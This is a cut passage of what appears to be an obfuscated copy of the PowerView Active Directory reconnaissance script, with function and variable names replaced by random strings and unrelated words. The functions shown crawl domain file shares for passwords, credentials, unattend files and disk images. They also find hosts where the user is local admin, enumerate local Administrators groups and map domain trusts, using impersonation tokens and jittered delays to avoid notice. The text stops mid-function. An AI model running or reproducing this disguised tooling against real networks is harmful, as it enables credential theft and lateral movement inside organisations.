                'CheckShareAccess' = $pRoiuLpi99
                'TokenHandle' = $PcHfgoeR99
            }
            spaced -BoyAErDp99 $voVxECvy99 -VmbuGSUi99 $GQOwBNso99 -TuoSIuWn99 $xcnPnXrE99 -KYLUFgiv99 $KYLUFgiv99
        }
    }
    END {
        if ($PcHfgoeR99) {
            enrolled -iJJxkpFW99 $PcHfgoeR99
        }
    }
}
function misdiagnosis {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $BoyAErDp99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSKdjHHA99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ALlpyaOL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $aHiEPZaB99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $rBGjwAAv99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $iOERMkAn99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $UntQDNuv99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $qCecPaoL99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $JpVBOxZh99,
        [String[]]
        $GAmQEqWk99 = @('C$', 'Admin$', 'Print$', 'IPC$'),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $SNftXGrU99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $GgTYlKye99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $rUwweuDO99,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $MaeaFmuB99,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $ChXzMeTA99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $hFAFUxDJ99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $KYLUFgiv99 = 20
    )
    BEGIN {
        $ZjqCBLnd99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ZjqCBLnd99['Domain'] = $SSKdjHHA99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ZjqCBLnd99['LDAPFilter'] = $ALlpyaOL99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $ZjqCBLnd99['SearchBase'] = $aHiEPZaB99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ZjqCBLnd99['OperatingSystem'] = $MHzuHSVj99 }
        if ($PSBoundParameters['ComputerServicePack']) { $ZjqCBLnd99['ServicePack'] = $IooYAKOh99 }
        if ($PSBoundParameters['ComputerSiteName']) { $ZjqCBLnd99['SiteName'] = $AxVRNJsI99 }
        if ($PSBoundParameters['Server']) { $ZjqCBLnd99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $ZjqCBLnd99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $ZjqCBLnd99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ZjqCBLnd99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $ZjqCBLnd99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $ZjqCBLnd99['Credential'] = $DegNROrc99 }
        if ($PSBoundParameters['ComputerName']) {
            $voVxECvy99 = $BoyAErDp99
        }
        else {
            Write-Verbose '[misdiagnosis] Querying computers in the domain'
            $voVxECvy99 = snivel @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[misdiagnosis] TargetComputers length: $($voVxECvy99.Length)"
        if ($voVxECvy99.Length -eq 0) {
            throw '[misdiagnosis] No hosts found to enumerate'
        }
        $GQOwBNso99 = {
            Param($BoyAErDp99, $qCecPaoL99, $GAmQEqWk99, $MaeaFmuB99, $dMQkXRKy99, $ChXzMeTA99, $pFxARMdl99, $iJJxkpFW99)
            if ($iJJxkpFW99) {
                $Null = dizzied -iJJxkpFW99 $iJJxkpFW99 -Quiet
            }
            ForEach ($RrDltCuw99 in $BoyAErDp99) {
                $IlUinCZt99 = @()
                if ($RrDltCuw99.StartsWith('\\')) {
                    $IlUinCZt99 += $RrDltCuw99
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -BoyAErDp99 $RrDltCuw99
                    if ($Up) {
                        $BETUrxBA99 = ridiculous -BoyAErDp99 $RrDltCuw99
                        ForEach ($Share in $BETUrxBA99) {
                            $MVreDyRZ99 = $Share.Name
                            $Path = '\\'+$RrDltCuw99+'\'+$MVreDyRZ99
                            if (($MVreDyRZ99) -and ($MVreDyRZ99.Trim() -ne '')) {
                                if ($GAmQEqWk99 -NotContains $MVreDyRZ99) {
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $IlUinCZt99 += $Path
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }
                ForEach ($Share in $IlUinCZt99) {
                    Write-Verbose "Searching share: $Share"
                    $lkBVOjGu99 = @{
                        'Path' = $Share
                        'Include' = $qCecPaoL99
                    }
                    if ($MaeaFmuB99) {
                        $lkBVOjGu99['OfficeDocs'] = $MaeaFmuB99
                    }
                    if ($ChXzMeTA99) {
                        $lkBVOjGu99['FreshEXEs'] = $ChXzMeTA99
                    }
                    if ($SNftXGrU99) {
                        $lkBVOjGu99['LastAccessTime'] = $SNftXGrU99
                    }
                    if ($GgTYlKye99) {
                        $lkBVOjGu99['LastWriteTime'] = $GgTYlKye99
                    }
                    if ($rUwweuDO99) {
                        $lkBVOjGu99['CreationTime'] = $rUwweuDO99
                    }
                    if ($pFxARMdl99) {
                        $lkBVOjGu99['CheckWriteAccess'] = $pFxARMdl99
                    }
                    Indira @SearchArgs
                }
            }
            if ($iJJxkpFW99) {
                enrolled
            }
        }
        $PcHfgoeR99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99
            }
            else {
                $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[misdiagnosis] Total number of hosts: $($voVxECvy99.count)"
            Write-Verbose "[misdiagnosis] Delay: $Delay, Jitter: $hFAFUxDJ99"
            $pAOTTRkE99 = 0
            $TIOJdLfI99 = New-Object System.Random
            ForEach ($RrDltCuw99 in $voVxECvy99) {
                $pAOTTRkE99 = $pAOTTRkE99 + 1
                Start-Sleep -Seconds $TIOJdLfI99.Next((1-$hFAFUxDJ99)*$Delay, (1+$hFAFUxDJ99)*$Delay)
                Write-Verbose "[misdiagnosis] Enumerating server $RrDltCuw99 ($pAOTTRkE99 of $($voVxECvy99.count))"
                Invoke-Command -VmbuGSUi99 $GQOwBNso99 -ArgumentList $RrDltCuw99, $qCecPaoL99, $GAmQEqWk99, $MaeaFmuB99, $dMQkXRKy99, $ChXzMeTA99, $pFxARMdl99, $PcHfgoeR99
            }
        }
        else {
            Write-Verbose "[misdiagnosis] Using threading with threads: $KYLUFgiv99"
            $xcnPnXrE99 = @{
                'Include' = $qCecPaoL99
                'ExcludedShares' = $GAmQEqWk99
                'OfficeDocs' = $MaeaFmuB99
                'ExcludeHidden' = $dMQkXRKy99
                'FreshEXEs' = $ChXzMeTA99
                'CheckWriteAccess' = $pFxARMdl99
                'TokenHandle' = $PcHfgoeR99
            }
            spaced -BoyAErDp99 $voVxECvy99 -VmbuGSUi99 $GQOwBNso99 -TuoSIuWn99 $xcnPnXrE99 -KYLUFgiv99 $KYLUFgiv99
        }
    }
    END {
        if ($PcHfgoeR99) {
            enrolled -iJJxkpFW99 $PcHfgoeR99
        }
    }
}
function vicissitude {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $BoyAErDp99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSKdjHHA99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ALlpyaOL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $aHiEPZaB99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $rBGjwAAv99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $iOERMkAn99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $UntQDNuv99,
        [Switch]
        $pRoiuLpi99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $hFAFUxDJ99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $KYLUFgiv99 = 20
    )
    BEGIN {
        $ZjqCBLnd99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ZjqCBLnd99['Domain'] = $SSKdjHHA99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ZjqCBLnd99['LDAPFilter'] = $ALlpyaOL99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $ZjqCBLnd99['SearchBase'] = $aHiEPZaB99 }
        if ($PSBoundParameters['Unconstrained']) { $ZjqCBLnd99['Unconstrained'] = $GNUthHex99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ZjqCBLnd99['OperatingSystem'] = $MHzuHSVj99 }
        if ($PSBoundParameters['ComputerServicePack']) { $ZjqCBLnd99['ServicePack'] = $IooYAKOh99 }
        if ($PSBoundParameters['ComputerSiteName']) { $ZjqCBLnd99['SiteName'] = $AxVRNJsI99 }
        if ($PSBoundParameters['Server']) { $ZjqCBLnd99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $ZjqCBLnd99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $ZjqCBLnd99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ZjqCBLnd99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $ZjqCBLnd99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $ZjqCBLnd99['Credential'] = $DegNROrc99 }
        if ($PSBoundParameters['ComputerName']) {
            $voVxECvy99 = $BoyAErDp99
        }
        else {
            Write-Verbose '[vicissitude] Querying computers in the domain'
            $voVxECvy99 = snivel @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[vicissitude] TargetComputers length: $($voVxECvy99.Length)"
        if ($voVxECvy99.Length -eq 0) {
            throw '[vicissitude] No hosts found to enumerate'
        }
        $GQOwBNso99 = {
            Param($BoyAErDp99, $iJJxkpFW99)
            if ($iJJxkpFW99) {
                $Null = dizzied -iJJxkpFW99 $iJJxkpFW99 -Quiet
            }
            ForEach ($RrDltCuw99 in $BoyAErDp99) {
                $Up = Test-Connection -Count 1 -Quiet -BoyAErDp99 $RrDltCuw99
                if ($Up) {
                    $WDXrzzwl99 = runarounds -BoyAErDp99 $RrDltCuw99
                    if ($WDXrzzwl99.IsAdmin) {
                        $RrDltCuw99
                    }
                }
            }
            if ($iJJxkpFW99) {
                enrolled
            }
        }
        $PcHfgoeR99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99
            }
            else {
                $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[vicissitude] Total number of hosts: $($voVxECvy99.count)"
            Write-Verbose "[vicissitude] Delay: $Delay, Jitter: $hFAFUxDJ99"
            $pAOTTRkE99 = 0
            $TIOJdLfI99 = New-Object System.Random
            ForEach ($RrDltCuw99 in $voVxECvy99) {
                $pAOTTRkE99 = $pAOTTRkE99 + 1
                Start-Sleep -Seconds $TIOJdLfI99.Next((1-$hFAFUxDJ99)*$Delay, (1+$hFAFUxDJ99)*$Delay)
                Write-Verbose "[vicissitude] Enumerating server $RrDltCuw99 ($pAOTTRkE99 of $($voVxECvy99.count))"
                Invoke-Command -VmbuGSUi99 $GQOwBNso99 -ArgumentList $RrDltCuw99, $PcHfgoeR99
            }
        }
        else {
            Write-Verbose "[vicissitude] Using threading with threads: $KYLUFgiv99"
            $xcnPnXrE99 = @{
                'TokenHandle' = $PcHfgoeR99
            }
            spaced -BoyAErDp99 $voVxECvy99 -VmbuGSUi99 $GQOwBNso99 -TuoSIuWn99 $xcnPnXrE99 -KYLUFgiv99 $KYLUFgiv99
        }
    }
}
function forming {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $BoyAErDp99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSKdjHHA99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ALlpyaOL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $aHiEPZaB99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $rBGjwAAv99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $iOERMkAn99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $UntQDNuv99,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $nrOpsRrf99 = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $vKlpkKQd99 = 'API',
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $hFAFUxDJ99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $KYLUFgiv99 = 20
    )
    BEGIN {
        $ZjqCBLnd99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ZjqCBLnd99['Domain'] = $SSKdjHHA99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ZjqCBLnd99['LDAPFilter'] = $ALlpyaOL99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $ZjqCBLnd99['SearchBase'] = $aHiEPZaB99 }
        if ($PSBoundParameters['Unconstrained']) { $ZjqCBLnd99['Unconstrained'] = $GNUthHex99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ZjqCBLnd99['OperatingSystem'] = $MHzuHSVj99 }
        if ($PSBoundParameters['ComputerServicePack']) { $ZjqCBLnd99['ServicePack'] = $IooYAKOh99 }
        if ($PSBoundParameters['ComputerSiteName']) { $ZjqCBLnd99['SiteName'] = $AxVRNJsI99 }
        if ($PSBoundParameters['Server']) { $ZjqCBLnd99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $ZjqCBLnd99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $ZjqCBLnd99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ZjqCBLnd99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $ZjqCBLnd99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $ZjqCBLnd99['Credential'] = $DegNROrc99 }
        if ($PSBoundParameters['ComputerName']) {
            $voVxECvy99 = $BoyAErDp99
        }
        else {
            Write-Verbose '[forming] Querying computers in the domain'
            $voVxECvy99 = snivel @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[forming] TargetComputers length: $($voVxECvy99.Length)"
        if ($voVxECvy99.Length -eq 0) {
            throw '[forming] No hosts found to enumerate'
        }
        $GQOwBNso99 = {
            Param($BoyAErDp99, $nrOpsRrf99, $vKlpkKQd99, $iJJxkpFW99)
            if ($nrOpsRrf99 -eq "Administrators") {
                $GkUZIdOx99 = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $nrOpsRrf99 = ($GkUZIdOx99.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }
            if ($iJJxkpFW99) {
                $Null = dizzied -iJJxkpFW99 $iJJxkpFW99 -Quiet
            }
            ForEach ($RrDltCuw99 in $BoyAErDp99) {
                $Up = Test-Connection -Count 1 -Quiet -BoyAErDp99 $RrDltCuw99
                if ($Up) {
                    $mxMyjVTO99 = @{
                        'ComputerName' = $RrDltCuw99
                        'Method' = $vKlpkKQd99
                        'GroupName' = $nrOpsRrf99
                    }
                    precipitated @NetLocalGroupMemberArguments
                }
            }
            if ($iJJxkpFW99) {
                enrolled
            }
        }
        $PcHfgoeR99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99
            }
            else {
                $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[forming] Total number of hosts: $($voVxECvy99.count)"
            Write-Verbose "[forming] Delay: $Delay, Jitter: $hFAFUxDJ99"
            $pAOTTRkE99 = 0
            $TIOJdLfI99 = New-Object System.Random
            ForEach ($RrDltCuw99 in $voVxECvy99) {
                $pAOTTRkE99 = $pAOTTRkE99 + 1
                Start-Sleep -Seconds $TIOJdLfI99.Next((1-$hFAFUxDJ99)*$Delay, (1+$hFAFUxDJ99)*$Delay)
                Write-Verbose "[forming] Enumerating server $RrDltCuw99 ($pAOTTRkE99 of $($voVxECvy99.count))"
                Invoke-Command -VmbuGSUi99 $GQOwBNso99 -ArgumentList $RrDltCuw99, $nrOpsRrf99, $vKlpkKQd99, $PcHfgoeR99
            }
        }
        else {
            Write-Verbose "[forming] Using threading with threads: $KYLUFgiv99"
            $xcnPnXrE99 = @{
                'GroupName' = $nrOpsRrf99
                'Method' = $vKlpkKQd99
                'TokenHandle' = $PcHfgoeR99
            }
            spaced -BoyAErDp99 $voVxECvy99 -VmbuGSUi99 $GQOwBNso99 -TuoSIuWn99 $xcnPnXrE99 -KYLUFgiv99 $KYLUFgiv99
        }
    }
    END {
        if ($PcHfgoeR99) {
            enrolled -iJJxkpFW99 $PcHfgoeR99
        }
    }
}
function accustoms {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $YXMSPUCr99,
        [Alias('ReturnOne')]
        [Switch]
        $JonZpKBd99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $mmHNbzbc99 = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }
        $ETlkBoxJ99 = @{}
        if ($PSBoundParameters['Domain']) { $ETlkBoxJ99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['LDAPFilter']) { $ETlkBoxJ99['LDAPFilter'] = $YcLdsqIq99 }
        if ($PSBoundParameters['Properties']) { $ETlkBoxJ99['Properties'] = $pwEfoKvn99 }
        if ($PSBoundParameters['SearchBase']) { $ETlkBoxJ99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $ETlkBoxJ99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $ETlkBoxJ99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $ETlkBoxJ99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ETlkBoxJ99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $ETlkBoxJ99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $ETlkBoxJ99['Credential'] = $DegNROrc99 }
    }
    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $kbiVkPgF99 = @{}
            if ($StsWGohF99 -and $StsWGohF99.Trim() -ne '') {
                $HRYZEsuR99 = $StsWGohF99
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $HRYZEsuR99 = (Md -DegNROrc99 $DegNROrc99).Name
                }
                else {
                    $HRYZEsuR99 = (Md).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($StsWGohF99 -and $StsWGohF99.Trim() -ne '') {
                $HRYZEsuR99 = $StsWGohF99
            }
            else {
                $HRYZEsuR99 = $Env:USERDNSDOMAIN
            }
        }
        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
            $GoOViDDV99 = Zimbabweans @LdapSearcherArguments
            $GczZZwmU99 = initiate @NetSearcherArguments
            if ($GoOViDDV99) {
                $GoOViDDV99.Filter = '(objectClass=trustedDomain)'
                if ($PSBoundParameters['FindOne']) { $oboKDFwv99 = $GoOViDDV99.FindOne() }
                else { $oboKDFwv99 = $GoOViDDV99.FindAll() }
                $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $iKRJtUbd99 = New-Object PSObject
                    $WBkOwLVg99 = @()
                    $WBkOwLVg99 += $mmHNbzbc99.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $mmHNbzbc99[$_] }
                    $yoazxqsw99 = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }
                    $yUQHjyaE99 = Switch ($Props.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }
                    $frEwKyFW99 = $Props.distinguishedname[0]
                    $IUayCKDd99 = $frEwKyFW99.IndexOf('DC=')
                    if ($IUayCKDd99) {
                        $HRYZEsuR99 = $($frEwKyFW99.SubString($IUayCKDd99)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $HRYZEsuR99 = ""
                    }
                    $LfIsQQRq99 = $frEwKyFW99.IndexOf(',CN=System')
                    if ($IUayCKDd99) {
                        $hfELBeHx99 = $frEwKyFW99.SubString(3, $LfIsQQRq99-3)
                    }
                    else {
                        $hfELBeHx99 = ""
                    }
                    $sYLyPwQa99 = New-Object Guid @(,$Props.objectguid[0])
                    $vsPNMyyw99 = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value
                    $iKRJtUbd99 | Add-Member Noteproperty 'SourceName' $HRYZEsuR99
                    $iKRJtUbd99 | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    $iKRJtUbd99 | Add-Member Noteproperty 'TrustType' $yUQHjyaE99
                    $iKRJtUbd99 | Add-Member Noteproperty 'TrustAttributes' $($WBkOwLVg99 -join ',')
                    $iKRJtUbd99 | Add-Member Noteproperty 'TrustDirection' "$yoazxqsw99"
                    $iKRJtUbd99 | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
                    $iKRJtUbd99 | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
                    $iKRJtUbd99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $iKRJtUbd99
                }
                if ($oboKDFwv99) {
                    try { $oboKDFwv99.dispose() }
                    catch {
                        Write-Verbose "[accustoms] Error disposing of the Results object: $_"
                    }
                }
                $GoOViDDV99.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            if ($PSBoundParameters['Server']) {
                $eDRiGpZI99 = $sWbqYnBA99
            }
            elseif ($StsWGohF99 -and $StsWGohF99.Trim() -ne '') {
                $eDRiGpZI99 = $StsWGohF99
            }
            else {
                $eDRiGpZI99 = $Null
            }
            $HOChRdeK99 = [IntPtr]::Zero
            $Flags = 63
            $tmPvBqmd99 = 0
            $rKtGlbHQ99 = $CBPFTmxs99::DsEnumerateDomainTrusts($eDRiGpZI99, $Flags, [ref]$HOChRdeK99, [ref]$tmPvBqmd99)
            $LIdFeKYN99 = $HOChRdeK99.ToInt64()
            if (($rKtGlbHQ99 -eq 0) -and ($LIdFeKYN99 -gt 0)) {
                $vkFCmlnO99 = $ewJilPDX99::GetSize()
                for ($i = 0; ($i -lt $tmPvBqmd99); $i++) {
                    $bglqjtHZ99 = New-Object System.Intptr -ArgumentList $LIdFeKYN99
                    $Info = $bglqjtHZ99 -as $ewJilPDX99
                    $LIdFeKYN99 = $bglqjtHZ99.ToInt64()
